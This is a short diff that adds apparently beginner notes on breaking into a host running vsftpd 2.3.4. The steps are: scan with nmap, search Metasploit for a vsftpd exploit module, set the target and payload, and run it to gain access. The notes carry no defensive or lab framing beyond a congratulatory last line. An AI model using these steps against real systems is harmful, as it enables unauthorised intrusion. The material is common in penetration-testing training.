@@ -1,0 +1,15 @@
+sudo msfconsole 
+nmap -sV target_ip   ----> Helps check for open ports
+example port 21, state open, service ftp, version vsftpd 2.3.4
+
+in msf :-
+search vsftpd
+use exploit/unix.... (use whichever module needed)
+show options
+set RHOSTS etc etc
+set payload *double tap* {to see which payload you can utilise}
+exploit
+
+
+
+----------------------CONGRATS You now have access to the system---------------
